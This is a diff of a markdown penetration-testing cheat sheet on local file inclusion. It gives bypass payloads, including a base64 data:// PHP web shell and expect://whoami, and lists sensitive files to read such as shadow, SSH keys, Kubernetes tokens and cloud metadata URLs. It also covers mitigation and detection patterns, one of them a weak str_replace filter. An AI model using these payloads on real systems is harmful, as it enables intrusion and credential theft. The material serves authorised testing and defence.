@@ -1,8 +1,8 @@
 # LFI Read Access Cheat Sheet
 
-**Author:** Julien Bongars  
+**Author:** Julien Bongars\
 **Date:** 2025-10-13 01:00:27
-**Path:** 
+**Path:**
 
 ---
 
@@ -18,16 +18,19 @@
 ## Reminder: Common LFI Bypass Techniques (for testing)
 
 ### Null Byte Injection (PHP < 5.3.4)
+
 ```
 ?file=../../../../etc/passwd%00
 ```
 
 ### Path Truncation
+
 ```
 ?file=../../../../etc/passwd................................................................
 ```
 
 ### PHP Wrappers
+
 ```
 php://filter/convert.base64-encode/resource=config.php
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
@@ -35,14 +38,17 @@ expect://whoami
 ```
 
 ### Double Encoding
+
 ```
 ?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
 ```
+
 ---
 
 ## OS & Kernel Information
 
 ### System Details
+
 ```bash
 /etc/os-release          # OS name, version, ID
 /proc/version            # Kernel version and build info
@@ -51,6 +57,7 @@ expect://whoami
 ```
 
 ### System Configuration
+
 ```bash
 /etc/hostname            # System hostname
 /etc/timezone            # System timezone
@@ -65,6 +72,7 @@ expect://whoami
 ## Network Configuration
 
 ### Network Files
+
 ```bash
 /etc/hosts               # Static hostname mappings
 /etc/resolv.conf         # DNS resolver configuration
@@ -74,6 +82,7 @@ expect://whoami
 ```
 
 ### Network Services
+
 ```bash
 /etc/dnsmasq.conf        # DNS/DHCP service config
 /etc/dhcpcd.conf         # DHCP client daemon config
@@ -89,6 +98,7 @@ expect://whoami
 ## Current Process Information
 
 ### Environment Variables
+
 ```bash
 /proc/self/environ       # Environment variables of current process
 /proc/self/cwd           # Current working directory (symlink)
@@ -97,6 +107,7 @@ expect://whoami
 ```
 
 ### Process Details
+
 ```bash
 /proc/self/cmdline       # Command line arguments
 /proc/self/status        # Process status (PID, UIDs, GIDs)
@@ -106,6 +117,7 @@ expect://whoami
 ```
 
 ### Specific PIDs
+
 ```bash
 /proc/[PID]/environ      # Environment for specific process
 /proc/[PID]/cmdline      # Command line for specific process
@@ -117,6 +129,7 @@ expect://whoami
 ## User & Authentication
 
 ### User Information
+
 ```bash
 /etc/passwd              # User accounts (no passwords)
 /etc/shadow              # Password hashes (requires root)
@@ -126,6 +139,7 @@ expect://whoami
 ```
 
 ### User Files
+
 ```bash
 /home/[user]/.ssh/id_rsa           # Private SSH key
 /home/[user]/.ssh/id_rsa.pub       # Public SSH key
@@ -138,6 +152,7 @@ expect://whoami
 ```
 
 ### Authentication Logs
+
 ```bash
 /var/log/auth.log        # Authentication logs (Debian/Ubuntu)
 /var/log/secure          # Authentication logs (RHEL/CentOS)
@@ -150,6 +165,7 @@ expect://whoami
 ## Web Application Files
 
 ### Apache
+
 ```bash
 /etc/apache2/apache2.conf           # Main config
 /etc/apache2/sites-enabled/000-default.conf
@@ -160,6 +176,7 @@ expect://whoami
 ```
 
 ### Nginx
+
 ```bash
 /etc/nginx/nginx.conf               # Main config
 /etc/nginx/sites-enabled/default    # Default site config
@@ -168,6 +185,7 @@ expect://whoami
 ```
 
 ### PHP
+
 ```bash
 /etc/php/*/apache2/php.ini          # PHP config (Apache)
 /etc/php/*/fpm/php.ini              # PHP-FPM config
@@ -175,6 +193,7 @@ expect://whoami
 ```
 
 ### Application Files
+
 ```bash
 /var/www/html/config.php            # Common config file
 /var/www/html/.env                  # Environment variables
@@ -188,6 +207,7 @@ expect://whoami
 ## Database Configuration
 
 ### MySQL/MariaDB
+
 ```bash
 /etc/mysql/my.cnf                   # Main config
 /etc/mysql/mysql.conf.d/mysqld.cnf  # Server config
@@ -195,6 +215,7 @@ expect://whoami
 ```
 
 ### PostgreSQL
+
 ```bash
 /etc/postgresql/*/main/postgresql.conf  # Main config
 /etc/postgresql/*/main/pg_hba.conf      # Authentication config
@@ -202,6 +223,7 @@ expect://whoami
 ```
 
 ### MongoDB
+
 ```bash
 /etc/mongod.conf                    # MongoDB config
 ```
@@ -211,6 +233,7 @@ expect://whoami
 ## System Logs
 
 ### General Logs
+
 ```bash
 /var/log/syslog          # System log (Debian/Ubuntu)
 /var/log/messages        # System log (RHEL/CentOS)
@@ -220,6 +243,7 @@ expect://whoami
 ```
 
 ### Application Logs
+
 ```bash
 /var/log/apache2/*       # Apache logs
 /var/log/nginx/*         # Nginx logs
@@ -230,6 +254,7 @@ expect://whoami
 ```
 
 ### Audit Logs
+
 ```bash
 /var/log/audit/audit.log          # Auditd logs
 /var/log/laurel/audit.log         # LAUREL formatted audit logs
@@ -240,6 +265,7 @@ expect://whoami
 ## Service Configuration
 
 ### SSH
+
 ```bash
 /etc/ssh/sshd_config     # SSH server config
 /etc/ssh/ssh_config      # SSH client config
@@ -247,6 +273,7 @@ expect://whoami
 ```
 
 ### Cron
+
 ```bash
 /etc/crontab             # System crontab
 /etc/cron.d/*            # Cron jobs
@@ -256,6 +283,7 @@ expect://whoami
 ```
 
 ### Systemd
+
 ```bash
 /etc/systemd/system/*    # System unit files
 /lib/systemd/system/*    # Distribution unit files
@@ -267,18 +295,21 @@ expect://whoami
 ## Container & Virtualization
 
 ### Docker
+
 ```bash
 /var/lib/docker/containers/*/config.v2.json  # Container configs
 /.dockerenv                                   # Docker environment marker
 ```
 
 ### Kubernetes
+
 ```bash
 /var/run/secrets/kubernetes.io/serviceaccount/token  # K8s service token
 /var/run/secrets/kubernetes.io/serviceaccount/ca.crt # K8s CA cert
 ```
 
 ### Cloud Metadata
+
 ```bash
 http://169.254.169.254/latest/meta-data/     # AWS metadata (SSRF)
 http://metadata.google.internal/             # GCP metadata (SSRF)
@@ -289,6 +320,7 @@ http://metadata.google.internal/             # GCP metadata (SSRF)
 ## Backup & Temporary Files
 
 ### Backups
+
 ```bash
 /var/backups/*           # System backups
 /root/backup.sql         # Common backup location
@@ -299,6 +331,7 @@ http://metadata.google.internal/             # GCP metadata (SSRF)
 ```
 
 ### Temporary Files
+
 ```bash
 /tmp/*                   # Temporary files
 /var/tmp/*               # Persistent temporary files
@@ -310,12 +343,14 @@ http://metadata.google.internal/             # GCP metadata (SSRF)
 ## Mail & Services
 
 ### Mail
+
 ```bash
 /var/mail/*              # User mailboxes
 /var/spool/mail/*        # Alternative mail location
 ```
 
 ### FTP
+
 ```bash
 /etc/vsftpd.conf         # vsftpd config
 /etc/proftpd/proftpd.conf  # ProFTPD config
@@ -326,6 +361,7 @@ http://metadata.google.internal/             # GCP metadata (SSRF)
 ## LFI Prevention & Mitigation
 
 ### Input Validation
+
 ```php
 // BAD - Direct user input
 include($_GET['page'] . '.php');
@@ -343,6 +379,7 @@ include('/var/www/pages/' . $file);
 ```
 
 ### Path Sanitization
+
 ```php
 // Remove directory traversal sequences
 $file = str_replace(['../', '..\\', '../\\'], '', $_GET['file']);
@@ -356,6 +393,7 @@ if (strpos($file, $basedir) === 0) {
 ```
 
 ### PHP Configuration Hardening
+
 ```ini
 ; php.ini hardening
 allow_url_fopen = Off          ; Disable remote file inclusion
@@ -367,6 +405,7 @@ disable_functions = exec,passthru,shell_exec,system,proc_open,popen
 ### Web Server Configuration
 
 **Apache (.htaccess)**
+
 ```apache
 # Deny access to sensitive files
 <FilesMatch "\.(log|ini|conf|bak|old)$">
@@ -382,6 +421,7 @@ RewriteRule .* - [F,L]
 ```
 
 **Nginx**
+
 ```nginx
 # Block access to sensitive files
 location ~* \.(log|ini|conf|bak|old)$ {
@@ -397,6 +437,7 @@ if ($args ~* "\.\./") {
 ### Application-Level Protections
 
 **File Access Control**
+
 ```php
 // Use a mapping system instead of direct file inclusion
 $pages = [
@@ -415,6 +456,7 @@ if (isset($pages[$page])) {
 ```
 
 **Read-Only File System**
+
 ```bash
 # Mount application directory as read-only
 mount -o remount,ro /var/www/html
@@ -426,6 +468,7 @@ docker run --read-only -v /tmp:/tmp myapp
 ### Monitoring & Detection
 
 **Log Monitoring**
+
 ```bash
 # Monitor for LFI patterns in logs
 grep -E "(\.\.\/|etc/passwd|php://|file://)" /var/log/apache2/access.log
@@ -437,6 +480,7 @@ failregex = ^<HOST> .* "GET .*(\.\./|etc/passwd|php://|file://).*"
 ```
 
 **WAF Rules**
+
 ```
 # ModSecurity rules for LFI
 SecRule ARGS "@rx (?:\.\./|etc/passwd|php://|file://)" \
@@ -455,6 +499,5 @@ SecRule ARGS "@rx (?:\.\./|etc/passwd|php://|file://)" \
 8. **Keep software updated** - Patch known vulnerabilities
 
 ---
-
 
 **Remember:** This cheat sheet is for authorized security testing and defense purposes only. Unauthorized access to systems is illegal.
